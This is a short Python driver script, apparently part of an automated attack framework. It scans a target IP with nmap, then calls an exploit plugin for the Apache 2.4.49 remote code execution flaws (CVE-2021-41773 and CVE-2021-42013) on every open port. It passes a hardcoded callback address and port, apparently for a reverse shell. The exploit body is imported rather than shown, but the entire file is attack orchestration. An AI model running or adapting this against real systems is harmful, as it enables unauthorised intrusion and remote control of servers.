import argparse
import recon
import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
    args = parser.parse_args()
    res_recon = recon.nmap_scan(args.target_ip)
    for i in res_recon:
        try:
            print('[+] Attempting to gain access with CVE-2021-41773 or CVE-2021-42013...')
            plugin_initial_access_apache2_4_49_RCE.exploit(args.target_ip, i['port'], '172.19.45.72', 4321)
        except Exception as e:
            print(e)
